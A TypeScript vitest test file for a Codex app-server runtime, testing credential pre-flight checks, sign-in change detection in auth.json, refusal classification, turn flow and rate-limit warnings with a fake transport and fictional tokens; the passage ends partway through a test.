import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  AuthUnavailableError,
  CodexRefusedItsSignInError,
  codexCopyIdentityIn,
  CodexRuntime,
  codexAccountIn,
  CodexSessionHandle,
  ResumeError,
  type CodexIncoming,
  type CodexLaunchContext,
  type CodexTransport,
  type PermissionDecision,
  type PermissionOutcome,
  type PermissionScope,
  ALWAYS_HONOURED,
  isAlwaysHonoured,
  type RuntimeEvent,
  type SessionHandle,
  type StartPhaseSink,
  QUESTION_REQUEST_KEYS,
  askedOfTheChannel,
  TurnInProgress,
} from '../src/index'
import { MAX_PERMISSION_DETAIL_CHARS } from '../src/events'
import { z } from 'zod'
import type { AgentToolset } from '../src/agent-tools'
import {
  A_COMPACTION_IS_STILL_OUTSTANDING,
  CODEX_PLAN_TOOL_CONFIG,
  CODEX_QUESTION_TOOL_CONFIG,
  codexAppServerArgs,
  createSpawnTransportFactory,
  THE_AGENT_ASKS_FOR_ACCESS,
} from '../src/codex/codex-runtime'
import { AsyncQueue } from '../src/internal/async-queue'
import { CODEX_PROTOCOL_VERSION, codexVersionFromUserAgent } from '../src/codex/protocol-version'
import type { ServerRequestResolvedNotification } from '../src/codex/protocol/v2/ServerRequestResolvedNotification'
import {
  completedTurn,
  failedTurn,
  malformedThreadStartResponse,
  malformedTurnStartResponse,
  threadStartResponse,
  threadStartResponseWithEmptyId,
  threadStartResponseWithoutCwd,
  turnCompletedNotification,
  turnStartResponse,
  turnStartedNotification,
} from './fixtures/codex-protocol'

const EVERY_THREAD_OVERLAY = { ...CODEX_PLAN_TOOL_CONFIG, ...CODEX_QUESTION_TOOL_CONFIG }

beforeAll(() => {
  for (const kept of ['settings.json', 'brobot-kept-tool-approvals.json']) {
    expect(existsSync(`/tmp/x/home/${kept}`), `/tmp/x/home/${kept} exists on this machine`).toBe(
      false,
    )
  }
})

class FakeTransport implements CodexTransport {
  private readonly queue = new AsyncQueue<CodexIncoming>()
  private readonly responders = new Map<string, (params: unknown) => unknown>()
  private readonly failing = new Set<string>()
  requests: { method: string; params: unknown }[] = []
  responses: { id: string | number; result: unknown }[] = []
  errors: { id: string | number; code: number; message: string }[] = []
  codexHome: string | undefined
  userAgent = `brobot2/${CODEX_PROTOCOL_VERSION} (Mac OS 26.3.0; arm64) vscode/1.130.0 (brobot2; 0.0.0)`
  closeCount = 0
  throwOnRespond = false
  turnStartIds: string[] = []
  private turnSeq = 0
  private deferNext = false
  private pendingTurnStart: ((result: unknown) => void) | null = null

  onRequest(method: string, responder: (params: unknown) => unknown): void {
    this.responders.set(method, responder)
  }
  deferNextTurnStart(): void {
    this.deferNext = true
  }
  settleTurnStart(id: string): void {
    this.turnStartIds.push(id)
    const resolve = this.pendingTurnStart
    this.pendingTurnStart = null
    resolve?.(turnStartResponse(id))
  }
  failRequest(method: string): void {
    this.failing.add(method)
  }
  notification(method: string, params: unknown): void {
    this.queue.push({ kind: 'notification', method, params })
  }
  serverRequest(id: string | number, method: string, params: unknown): void {
    const scoped =
      typeof params === 'object' && params !== null
        ? { threadId: 'th_1', turnId: this.lastTurnId, ...params }
        : params
    this.queue.push({ kind: 'request', id, method, params: scoped })
  }

  serverRequestRaw(id: string | number, method: string, params: unknown): void {
    this.queue.push({ kind: 'request', id, method, params })
  }

  get lastTurnId(): string {
    return this.turnStartIds[this.turnStartIds.length - 1] ?? ''
  }

  request(method: string, params: unknown): Promise<unknown> {
    this.requests.push({ method, params })
    if (this.failing.has(method)) return Promise.reject(new Error(`transport: ${method} failed`))
    const responder = this.responders.get(method)
    if (responder) return Promise.resolve(responder(params))
    if (method === 'initialize') {
      return Promise.resolve({
        userAgent: this.userAgent,
        codexHome: this.codexHome,
        platformFamily: 'unix',
        platformOs: 'macos',
      })
    }
    if (method === 'turn/start') {
      if (this.deferNext) {
        this.deferNext = false
        return new Promise((resolve) => {
          this.pendingTurnStart = resolve
        })
      }
      const id = `tn_${++this.turnSeq}`
      this.turnStartIds.push(id)
      return Promise.resolve(turnStartResponse(id))
    }
    return Promise.resolve({})
  }
  notify(): void {}
  respond(id: string | number, result: unknown): void {
    if (this.throwOnRespond) throw new Error('write after terminal')
    this.responses.push({ id, result })
  }
  respondError(id: string | number, code: number, message: string): void {
    this.errors.push({ id, code, message })
  }
  incoming(): AsyncIterable<CodexIncoming> {
    return this.queue
  }
  endIncoming(): void {
    this.queue.close()
  }
  close(): void {
    this.closeCount++
    this.queue.close()
  }
  exited: Promise<void> | undefined
  quiesced?: Promise<void>
  ownsAProcess(): () => void {
    let die!: () => void
    this.exited = new Promise<void>((resolve) => {
      die = resolve
    })
    return die
  }
}

function adopt(transport: FakeTransport): (ctx: CodexLaunchContext) => CodexTransport {
  return (ctx) => {
    transport.codexHome ??= ctx.providerHome
    return transport
  }
}

function collect(
  handle: { events(): AsyncIterable<RuntimeEvent> },
  sink: RuntimeEvent[],
): Promise<void> {
  return (async () => {
    for await (const event of handle.events()) sink.push(event)
  })()
}
function firstOfType<T extends RuntimeEvent['type']>(
  events: RuntimeEvent[],
  type: T,
): Extract<RuntimeEvent, { type: T }> {
  const found = events.find((e): e is Extract<RuntimeEvent, { type: T }> => e.type === type)
  if (!found) throw new Error(`no ${type} event found`)
  return found
}
const has = (events: RuntimeEvent[], pred: (e: RuntimeEvent) => boolean) => () =>
  expect(events.some(pred)).toBe(true)

const okThread = (id: string, cwd = '/tmp/x'): Record<string, unknown> =>
  threadStartResponse(id, cwd) as unknown as Record<string, unknown>

it.each(['handshake', 'callback'] as const)(
  'fresh allocation is owned before a failed %s and retains its unsettled exit witness',
  async (failure) => {
    const transport = new FakeTransport()
    const die = transport.ownsAProcess()
    transport.onRequest('initialize', () => {
      throw new Error('fictional handshake failure')
    })
    const runtime = new CodexRuntime(adopt(transport))
    let allocated: SessionHandle | undefined
    await expect(
      runtime.start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
        onSessionCreated(handle) {
          allocated = handle
          expect(transport.requests).toEqual([])
          if (failure === 'callback') throw new Error('fictional callback failure')
        },
      }),
    ).rejects.toThrow(`fictional ${failure} failure`)
    expect(allocated).toBeDefined()
    expect(transport.closeCount).toBe(1)
    let exited = false
    const witness = allocated!.awaitProcessExit!()!.then(() => {
      exited = true
    })
    await Promise.resolve()
    expect(exited).toBe(false)
    die()
    await witness
    expect(exited).toBe(true)
  },
)

async function startCodex(): Promise<{
  transport: FakeTransport
  handle: Awaited<ReturnType<CodexRuntime['start']>>
  events: RuntimeEvent[]
  consumer: Promise<void>
}> {
  const transport = new FakeTransport()
  transport.onRequest('thread/start', () => okThread('th_1'))
  const runtime = new CodexRuntime(adopt(transport))
  const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
  const events: RuntimeEvent[] = []
  const consumer = collect(handle, events)
  return { transport, handle, events, consumer }
}

async function startCodexInTurn(): Promise<{
  transport: FakeTransport
  handle: Awaited<ReturnType<CodexRuntime['start']>>
  events: RuntimeEvent[]
  consumer: Promise<void>
}> {
  const ctx = await startCodex()
  await ctx.handle.send('go')
  await vi.waitFor(() =>
    expect(ctx.events.filter((e) => e.type === 'status').at(-1)?.state).toBe('working'),
  )
  return ctx
}

describe('CodexRuntime — the credential pre-flight (098)', () => {
  const STATUS = (method: string | null) => ({
    authMethod: method,
    authToken: null,
    requiresOpenaiAuth: true,
  })
  const ACCOUNT = (account: unknown) => ({ account, requiresOpenaiAuth: true })
  const SIGNED_IN = { type: 'chatgpt', email: 'probe@example.invalid', planType: 'pro' }

  function transportAnswering(status: unknown, account: unknown): FakeTransport {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    transport.onRequest('thread/resume', () => okThread('th_1'))
    transport.onRequest('getAuthStatus', () => status)
    transport.onRequest('account/read', () => account)
    return transport
  }

  describe('a sign-in that moves to another account', () => {
    let home: string
    beforeEach(() => {
      home = mkdtempSync(join(tmpdir(), 'codex-moved-sign-in-'))
    })
    afterEach(() => rmSync(home, { recursive: true, force: true }))
    const signedIn = (account: string, accessToken: string): void =>
      writeFileSync(
        join(home, 'auth.json'),
        JSON.stringify({
          auth_mode: 'chatgpt',
          OPENAI_API_KEY: null,
          tokens: {
            id_token: 'fake-id-token',
            access_token: accessToken,
            refresh_token: 'fake-refresh-token',
            account_id: account,
          },
          last_refresh: '2026-10-06T00:00:00Z',
        }),
      )
    const started = () =>
      new CodexRuntime(adopt(transportAnswering(STATUS('chatgpt'), ACCOUNT(SIGNED_IN)))).start({
        cwd: home,
        providerHome: home,
      })

    it('🔴 the same account renewing its own tokens never trips it', async () => {
      signedIn('acct-one', 'fake-access-one')
      const handle = await started()
      signedIn('acct-one', 'fake-access-two')
      expect(await handle.checkSignIn?.()).toBe(false)
      expect(handle.signInSuperseded).toBe(false)
    })

    it('🔴 another account trips it, and it stays tripped', async () => {
      signedIn('acct-one', 'fake-access-one')
      const handle = await started()
      signedIn('acct-two', 'fake-access-three')
      expect(await handle.checkSignIn?.()).toBe(true)
      signedIn('acct-one', 'fake-access-one')
      expect(await handle.checkSignIn?.()).toBe(true)
      expect(handle.signInSuperseded).toBe(true)
    })

    it('a home that cannot be read now, or a launch with no readable login: cannot tell, never a change', async () => {
      signedIn('acct-one', 'fake-access-one')
      const handle = await started()
      writeFileSync(join(home, 'auth.json'), '{ half a fi')
      expect(await handle.checkSignIn?.()).toBe(false)
      rmSync(join(home, 'auth.json'))
      const unread = await started()
      signedIn('acct-two', 'fake-access-two')
      expect(await unread.checkSignIn?.()).toBe(false)
    })

    it('Codex’s own `auth_mode` decides the kind of login; a link in the home is not read', async () => {
      signedIn('acct-one', 'fake-access-one')
      const account = await codexAccountIn(home)
      expect(account).not.toBeNull()
      writeFileSync(
        join(home, 'auth.json'),
        JSON.stringify({
          auth_mode: 'chatgpt',
          OPENAI_API_KEY: 'a-made-up-key',
          tokens: { access_token: 'fake-access-two', account_id: 'acct-one' },
        }),
      )
      expect(await codexAccountIn(home)).toBe(account)
      writeFileSync(join(home, 'auth.json'), JSON.stringify({ auth_mode: 'agentIdentity' }))
      expect(await codexAccountIn(home)).toBeNull()
      const elsewhere = join(home, 'elsewhere.json')
      signedIn('acct-one', 'fake-access-one')
      renameSync(join(home, 'auth.json'), elsewhere)
      symlinkSync(elsewhere, join(home, 'auth.json'))
      expect(await codexAccountIn(home)).toBeNull()
    })

    it('a key in place of a sign-in is another account too', async () => {
      signedIn('acct-one', 'fake-access-one')
      const handle = await started()
      writeFileSync(
        join(home, 'auth.json'),
        JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: 'a-made-up-key' }),
      )
      expect(await handle.checkSignIn?.()).toBe(true)
    })

    it('the tag it gives its sign-in is of the account: a renewal keeps it, another account or a key does not', async () => {
      signedIn('acct-one', 'fake-access-one')
      const tag = (await started()).signInTag?.()
      expect(tag).toMatch(/^account:[0-9a-f]{64}$/)
      signedIn('acct-one', 'fake-access-two')
      expect((await started()).signInTag?.()).toBe(tag)
      signedIn('acct-two', 'fake-access-three')
      expect((await started()).signInTag?.()).toMatch(/^account:[0-9a-f]{64}$/)
      expect((await started()).signInTag?.()).not.toBe(tag)
      writeFileSync(
        join(home, 'auth.json'),
        JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: 'a-made-up-key' }),
      )
      expect((await started()).signInTag?.()).toBeNull()
    })

    it('a saved key has a stable launch identity by revision, with no key in it', async () => {
      writeFileSync(
        join(home, 'auth.json'),
        JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: 'fictional-key' }),
      )
      const stamp = (revision: number) =>
        writeFileSync(join(home, 'brobot-api-key-login.json'), JSON.stringify({ setAt: revision }))
      stamp(17)
      const first = await started()
      const tag = first.signInTag?.()
      expect(tag).toBe('api-revision:17')
      expect((await started()).signInTag?.()).toBe(tag)
      stamp(18)
      expect((await started()).signInTag?.()).not.toBe(tag)
      expect(first.signInTag?.()).toBe(tag)
      expect(tag).not.toContain('fictional-key')
    })
  })

  it('refuses to start on an expired credential — before a thread exists, let alone a turn', async () => {
    const transport = transportAnswering(STATUS('chatgpt'), ACCOUNT(null))
    const runtime = new CodexRuntime(adopt(transport))

    await expect(runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })).rejects.toThrow(
      /sign-in has expired/,
    )
    expect(transport.requests.map((r) => r.method)).not.toContain('thread/start')
  })

  describe('which credential a refusal was', () => {
    const refusedAfterStartingOn = async (
      status: unknown,
      account: unknown,
    ): Promise<RuntimeEvent[]> => {
      const transport = transportAnswering(status, account)
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)
      transport.notification('error', {
        threadId: 'th_1',
        turnId: 'tn_none',
        error: { message: 'Incorrect API key provided', codexErrorInfo: 'unauthorized' },
      })
      await vi.waitFor(has(events, (e) => e.type === 'error'))
      await handle.close()
      await consumer
      return events.filter((e) => e.type === 'error')
    }

    it('🔴 on a saved key: the refusal is marked `onAKey`', async () => {
      expect(await refusedAfterStartingOn(STATUS('apikey'), ACCOUNT({ type: 'apiKey' }))).toEqual([
        {
          type: 'error',
          message: 'Incorrect API key provided',
          fatal: false,
          cause: 'auth',
          onAKey: true,
        },
      ])
    })

    it('⚑ control: on a ChatGPT sign-in, it is not', async () => {
      expect(await refusedAfterStartingOn(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))).toEqual([
        { type: 'error', message: 'Incorrect API key provided', fatal: false, cause: 'auth' },
      ])
    })

    const turnFailedWith = async (
      status: unknown,
      account: unknown,
      codexErrorInfo: string,
      message = 'refused',
    ): Promise<RuntimeEvent[]> => {
      const transport = transportAnswering(status, account)
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)
      await handle.send('go')
      await vi.waitFor(has(events, (e) => e.type === 'status' && e.state === 'working'))
      const failed = failedTurn('tn_1', message)
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', {
          ...failed,
          error: { ...failed.error!, codexErrorInfo: codexErrorInfo as never },
        }),
      )
      await vi.waitFor(has(events, (e) => e.type === 'turn'))
      await handle.close()
      await consumer
      return events.filter((e) => e.type === 'turn')
    }

    it('🔴 F076 · a turn failed on a saved key: its row says the login was refused, and that it was the key', async () => {
      expect(
        await turnFailedWith(STATUS('apikey'), ACCOUNT({ type: 'apiKey' }), 'unauthorized'),
      ).toEqual([{ type: 'turn', state: 'failed', loginRefused: true, onAKey: true }])
    })

    it('🔴 F076 · a turn failed on a ChatGPT sign-in: its row says the login was refused', async () => {
      expect(await turnFailedWith(STATUS('chatgpt'), ACCOUNT(SIGNED_IN), 'unauthorized')).toEqual([
        { type: 'turn', state: 'failed', loginRefused: true },
      ])
    })

    it('🔴 a turn failed where Codex finds the account’s workspace, on a sign-in it refused: typed `other`, and its row says the login was refused', async () => {
      const refusedAtRouting = 'workspace routing discovery unauthorized (401)'
      expect(
        await turnFailedWith(STATUS('chatgpt'), ACCOUNT(SIGNED_IN), 'other', refusedAtRouting),
      ).toEqual([{ type: 'turn', state: 'failed', loginRefused: true }])
      for (const message of [
        'workspace routing discovery failed',
        'workspace routing discovery timed out',
      ]) {
        const [row] = await turnFailedWith(STATUS('chatgpt'), ACCOUNT(SIGNED_IN), 'other', message)
        expect(row, message).toMatchObject({ type: 'turn', state: 'failed' })
        expect(row, message).not.toHaveProperty('loginRefused')
      }
    })

    it('⛔ a usage limit is never read as a refused login — on a key or a sign-in', async () => {
      for (const [status, account] of [
        [STATUS('apikey'), ACCOUNT({ type: 'apiKey' })],
        [STATUS('chatgpt'), ACCOUNT(SIGNED_IN)],
      ]) {
        const [row] = await turnFailedWith(status, account, 'usageLimitExceeded')
        expect(row).toMatchObject({ type: 'turn', state: 'failed' })
        expect(row).not.toHaveProperty('loginRefused')
      }
    })

    it('🔴 on a saved key, `usageLimitExceeded` is the key’s account out of quota: a billing refusal, never a limit', async () => {
      expect(
        await turnFailedWith(STATUS('apikey'), ACCOUNT({ type: 'apiKey' }), 'usageLimitExceeded'),
      ).toEqual([{ type: 'turn', state: 'failed', billingRefused: true, onAKey: true }])
    })

    it('⚑ control: on a ChatGPT sign-in it is the plan’s usage limit, as before', async () => {
      const [row] = await turnFailedWith(
        STATUS('chatgpt'),
        ACCOUNT(SIGNED_IN),
        'usageLimitExceeded',
      )
      expect(row).toMatchObject({ type: 'turn', state: 'failed', limit: { provider: 'codex' } })
      expect(row).not.toHaveProperty('billingRefused')
      expect(row).not.toHaveProperty('onAKey')
    })

    it('🔴 …and its `error` notification says the same, on a key only', async () => {
      const quotaOn = async (status: unknown, account: unknown): Promise<RuntimeEvent[]> => {
        const transport = transportAnswering(status, account)
        const handle = await new CodexRuntime(adopt(transport)).start({
          cwd: '/tmp/x',
          providerHome: '/tmp/x/home',
        })
        const events: RuntimeEvent[] = []
        const consumer = collect(handle, events)
        transport.notification('error', {
          threadId: 'th_1',
          turnId: 'tn_none',
          willRetry: false,
          error: {
            message: 'Quota exceeded. Check your plan and billing details.',
            codexErrorInfo: 'usageLimitExceeded',
          },
        })
        await vi.waitFor(has(events, (e) => e.type === 'error'))
        await handle.close()
        await consumer
        return events.filter((e) => e.type === 'error')
      }
      expect(await quotaOn(STATUS('apikey'), ACCOUNT({ type: 'apiKey' }))).toEqual([
        {
          type: 'error',
          message: 'Quota exceeded. Check your plan and billing details.',
          fatal: false,
          billingRefused: true,
          onAKey: true,
        },
      ])
      const [onASignIn] = await quotaOn(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))
      expect(onASignIn).not.toHaveProperty('billingRefused')
    })

    it('⚑ a probe that could not ask marks nothing — it learned nothing about the credential', async () => {
      const { transport, handle, events, consumer } = await startCodex()
      transport.notification('error', {
        threadId: 'th_1',
        turnId: 'tn_none',
        error: { message: 'Unauthorized', codexErrorInfo: 'unauthorized' },
      })
      await vi.waitFor(has(events, (e) => e.type === 'error'))
      expect(firstOfType(events, 'error')).not.toHaveProperty('onAKey')
      await handle.close()
      await consumer
    })
  })

  it('🔴 a turn that carries on hands Codex no input; a turn of words hands it its words', async () => {
    const transport = transportAnswering(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    const startsATurn = vi.spyOn(
      handle as unknown as { startATurn(text: string | null): Promise<void> },
      'startATurn',
    )
    const carried = handle.carryOn!()
    expect(carried).toBe(startsATurn.mock.results[0]?.value)
    await carried
    const turn = transport.requests.find((r) => r.method === 'turn/start')
    expect((turn?.params as { input?: unknown }).input).toEqual([])
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    const sent = handle.send('hello')
    expect(sent).toBe(startsATurn.mock.results[1]?.value)
    await sent
    const turns = transport.requests.filter((r) => r.method === 'turn/start')
    expect((turns[1]?.params as { input?: unknown }).input).toEqual([
      { type: 'text', text: 'hello', text_elements: [] },
    ])
    await handle.close()
  })

  it('starts normally on a working credential — the same code path, the other answer', async () => {
    const transport = transportAnswering(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })

    expect(transport.requests.map((r) => r.method)).toContain('thread/start')
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('🔴 a start Codex refuses names the copy it began on, and none when another was put there before Codex answered', async () => {
    const home = mkdtempSync(join(tmpdir(), 'brobot-codex-refused-home-'))
    const copy = join(home, 'auth.json')
    const fictional = JSON.stringify({
      auth_mode: 'chatgpt',
      tokens: { account_id: 'acct-fictional-a', access_token: 'FICTIONAL' },
    })
    try {
      writeFileSync(copy, fictional, { mode: 0o600 })
      const beganOn = codexCopyIdentityIn(home)
      expect(beganOn).not.toBeNull()
      const refused = new CodexRuntime(
        adopt(transportAnswering(STATUS('chatgpt'), ACCOUNT(null))),
      ).start({ cwd: '/tmp/x', providerHome: home })
      await expect(refused).rejects.toBeInstanceOf(CodexRefusedItsSignInError)
      await expect(refused).rejects.toMatchObject({ refusedCopy: beganOn })

      const started = adopt(transportAnswering(STATUS('chatgpt'), ACCOUNT(null)))
      const withAnotherPutThere = new CodexRuntime((context) => {
        writeFileSync(`${copy}.new`, fictional, { mode: 0o600 })
        renameSync(`${copy}.new`, copy)
        return started(context)
      }).start({ cwd: '/tmp/x', providerHome: home })
      await expect(withAnotherPutThere).rejects.toBeInstanceOf(CodexRefusedItsSignInError)
      await expect(withAnotherPutThere).rejects.toMatchObject({ refusedCopy: null })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('refuses a RESUME on an expired credential too — reopening is a launch (095)', async () => {
    const transport = transportAnswering(STATUS('chatgpt'), ACCOUNT(null))
    const runtime = new CodexRuntime(adopt(transport))
    const resuming = runtime.resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 3 },
      { providerHome: '/tmp/x/home' },
    )
    await expect(resuming).rejects.toThrow(/sign-in has expired/)
    await expect(resuming).rejects.toBeInstanceOf(AuthUnavailableError)
    await expect(resuming).rejects.not.toBeInstanceOf(ResumeError)
    await expect(resuming).rejects.toBeInstanceOf(CodexRefusedItsSignInError)
    await expect(resuming).rejects.toMatchObject({ refusedCopy: null })

    const ok = transportAnswering(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))
    const handle = await new CodexRuntime(adopt(ok)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 3 },
      { providerHome: '/tmp/x/home' },
    )
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('an app-server that does not answer the question still starts — `unknown` never blocks', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.ref?.sessionId).toBe('th_1')
    await handle.close()
  })

  it('🔒 the pre-flight never asks the provider to refresh', async () => {
    const transport = transportAnswering(STATUS('chatgpt'), ACCOUNT(SIGNED_IN))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    const asked = transport.requests.filter(
      (r) => r.method === 'getAuthStatus' || r.method === 'account/read',
    )
    expect(asked).toHaveLength(2)
    for (const request of asked) {
      expect((request.params as { refreshToken?: unknown }).refreshToken).toBe(false)
    }
    expect(
      (
        transport.requests.find((r) => r.method === 'getAuthStatus')?.params as {
          includeToken?: unknown
        }
      ).includeToken,
    ).toBe(false)
    await handle.close()
  })
})

describe('CodexRuntime — handshake & message flow', () => {
  it('start does initialize/initialized/thread/start (prompting profile) and exposes the ref', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    expect(handle.ref).toEqual({ provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 })
    await vi.waitFor(has(events, (e) => e.type === 'session'))
    expect(firstOfType(events, 'session').state).toBe('started')

    const start = transport.requests.find((r) => r.method === 'thread/start')
    expect(start?.params).toMatchObject({
      approvalPolicy: 'on-request',
      sandbox: 'workspace-write',
    })

    await handle.close()
    await consumer
  })

  it('send issues turn/start; turn/completed → turn+idle, never session:ended; close emits one session:ended', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('hi')
    expect(transport.requests.some((r) => r.method === 'turn/start')).toBe(true)

    transport.notification('turn/started', turnStartedNotification('th_1', 'tn_1'))
    transport.notification('item/agentMessage/delta', {
      threadId: 'th_1',
      turnId: 'tn_1',
      itemId: 'm1',
      delta: 'hey',
    })
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: { type: 'agentMessage', id: 'm1', text: 'hey' },
    })
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(has(events, (e) => e.type === 'turn' && e.state === 'completed'))
    expect(events.some((e) => e.type === 'assistant_delta' && e.text === 'hey')).toBe(true)
    expect(events.some((e) => e.type === 'assistant_message' && e.text === 'hey')).toBe(true)
    expect(events.some((e) => e.type === 'session' && e.state === 'ended')).toBe(false)

    await handle.close()
    await consumer
    expect(events.filter((e) => e.type === 'session' && e.state === 'ended')).toHaveLength(1)
    expect(handle.status()).toBe('ended')
  })

  it('⛔ 662 · a stamp changes nothing on the Codex wire — `turn/start` is identical with and without one', async () => {
    const bare = await startCodex()
    await bare.handle.send('hi')
    const stamped = await startCodex()
    await stamped.handle.send('hi', { kind: 'peer', from: 'sess_pm', name: 'Ada' })
    const turnStart = (transport: FakeTransport): unknown =>
      transport.requests.find((request) => request.method === 'turn/start')?.params
    expect(turnStart(stamped.transport), 'the stamped send did reach the wire').toBeDefined()
    expect(turnStart(stamped.transport)).toStrictEqual(turnStart(bare.transport))
    for (const one of [bare, stamped]) {
      await one.handle.close()
      await one.consumer
    }
  })

  it('⛔ the HANDLE carries the rate-limit watch — the wiring, not the class (188 §2)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    const frame = {
      rateLimits: {
        limitId: 'codex',
        primary: { usedPercent: 95, windowDurationMins: 300, resetsAt: 4_000_000_000 },
        secondary: null,
      },
    }
    transport.notification('account/rateLimits/updated', frame)
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.message.includes('95%')))
    transport.notification('account/rateLimits/updated', frame)
    transport.notification('account/rateLimits/updated', {
      rateLimits: {
        ...frame.rateLimits,
        primary: { usedPercent: 99, windowDurationMins: 300, resetsAt: 4_000_000_000 },
      },
    })
    await vi.waitFor(has(events, (e) => e.type === 'error' && e.message.includes('99%')))

    const warnings = events.filter((e) => e.type === 'error' && e.message.includes('rate limit'))
    expect(warnings.map((e) => (e.type === 'error' ? e.message : '')).join(' | ')).toContain('95%')
    expect(warnings, 'three frames, two states, two lines').toHaveLength(2)

    await handle.close()
    await consumer
  })

  it('unmapped notification → unknown card', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    transport.notification('some/future', { x: 1 })
    await vi.waitFor(has(events, (e) => e.type === 'unknown'))
    await handle.close()
    await consumer
  })

  describe('the rate-limit baseline (201 §2)', () => {
    const AT_THE_WALL = {
      limitId: 'codex',
      limitName: null,
      primary: { usedPercent: 100, windowDurationMins: 10080, resetsAt: 4_000_000_000 },
      secondary: null,
      credits: { hasCredits: false, unlimited: false, balance: '0' },
      individualLimit: null,
      spendControlReached: false,
      planType: 'prolite',
      rateLimitReachedType: 'rate_limit_reached',
    }
    const RESPONSE = {
      rateLimits: AT_THE_WALL,
      rateLimitsByLimitId: {
        codex: AT_THE_WALL,
        codex_bengalfox: {
          limitId: 'codex_bengalfox',
          limitName: 'GPT-5.3-Codex-Spark',
          primary: { usedPercent: 0, windowDurationMins: 300, resetsAt: 4_100_000_000 },
          secondary: null,
        },
      },
      rateLimitResetCredits: { availableCount: 0, credits: [] },
    }

    it('⛔ the handle ASKS, and a user already at the wall hears about it before any frame', async () => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      transport.onRequest('account/rateLimits/read', () => RESPONSE)
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)

      await vi.waitFor(has(events, (e) => e.type === 'error' && e.message.includes('rate-limited')))
      expect(transport.requests.filter((r) => r.method === 'account/rateLimits/read')).toHaveLength(
        1,
      )
      const record = events.find(
        (e) => e.type === 'unknown' && e.label === 'account/rateLimits/read',
      )
      expect(record?.type === 'unknown' ? record.category : null).toBe('lifecycle')
      expect(record?.type === 'unknown' ? record.raw : null).toMatchObject({
        method: 'account/rateLimits/read',
        result: { rateLimits: { rateLimitReachedType: 'rate_limit_reached' } },
      })

      transport.notification('account/rateLimits/updated', {
        rateLimits: {
          primary: { usedPercent: 92, windowDurationMins: 300, resetsAt: 4_000_000_000 },
        },
      })
      transport.notification('some/future', { marker: 1 })
      await vi.waitFor(has(events, (e) => e.type === 'unknown' && e.label === 'some/future'))
      expect(
        events.filter((e) => e.type === 'error' && e.message.includes('approaching')),
        'nothing weaker than the wall was ever said',
      ).toEqual([])

      await handle.close()
      await consumer
    })

    it('provider follow-ups 1 · a read that says ordinary usage is NOT allowed is asked again before the next turn, never inferred', async () => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1'))
      let reads = 0
      transport.onRequest('account/rateLimits/read', () => {
        reads += 1
        return { ...RESPONSE, ordinaryUsageAllowed: reads === 1 ? false : true }
      })
      const handle = await new CodexRuntime(adopt(transport)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      const events: RuntimeEvent[] = []
      const consumer = collect(handle, events)
      await vi.waitFor(() => expect(reads).toBe(1))
      await handle.send('go')
      await vi.waitFor(() => expect(reads).toBe(2))
      await handle.close()
      await consumer

      const quiet = new FakeTransport()
      quiet.onRequest('thread/start', () => okThread('th_2'))
      let quietReads = 0
      quiet.onRequest('account/rateLimits/read', () => {
        quietReads += 1
        return RESPONSE
      })
      const other = await new CodexRuntime(adopt(quiet)).start({
        cwd: '/tmp/x',
        providerHome: '/tmp/x/home',
      })
      await vi.waitFor(() => expect(quietReads).toBe(1))
